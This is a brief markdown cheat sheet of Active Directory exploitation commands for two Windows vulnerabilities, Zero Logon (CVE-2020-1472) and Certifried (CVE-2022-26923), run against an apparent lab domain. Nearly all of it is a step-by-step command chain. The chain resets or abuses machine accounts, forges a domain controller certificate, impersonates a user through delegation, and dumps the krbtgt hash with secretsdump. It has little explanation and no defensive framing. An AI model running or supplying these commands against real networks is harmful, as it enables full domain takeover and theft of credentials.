# Windows

## CVE-2020-1472 : Zero Logon
PoC based on this link : https://github.com/dirkjanm/CVE-2020-1472
```bash
python3 cve-2020-1472-exploit.py HOSTNAME IP
impacket-secretsdump 'HOSTNAME$@IP'
```

## CVE-2022-26923 : Certifried
More info in : https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html
```bash
python3 bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 addComputer cve 'CVEPassword1234*'
python3 bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 setAttribute 'CN=cve,CN=Computers,DC=crashlab,DC=local' dNSHostName '["CRASHDC.crashlab.local"]'
python3 bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 getObjectAttributes 'CN=cve,CN=Computers,DC=crashlab,DC=local' dNSHostName                  
certipy req 'crashlab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.100.10.12 -ca crashlab-ADCS-CA
certipy auth -pfx ./crashdc.pfx -dc-ip 10.100.10.12 OR openssl pkcs12 -in crashdc.pfx -out crashdc.pem -nodes | python3 bloodyAD.py -d crashlab.local  -c ":crashdc.pem" -u 'cve$' --host 10.100.10.12 setRbcd 'CVE$' 'CRASHDC$'
getST.py -spn LDAP/CRASHDC.CRASHLAB.LOCAL -impersonate emacron -dc-ip 10.100.10.12 'crashlab.local/cve$:CVEPassword1234*'                 
cp emacron.ccache /tmp/
export KRB5CCNAME=/tmp/emacron.ccache
impacket-secretsdump -user-status -just-dc-ntlm -just-dc-user krbtgt 'crashlab.local/emacron@crashdc.crashlab.local' -k -no-pass -dc-ip 10.100.10.12 -target-ip 10.100.10.12 
```
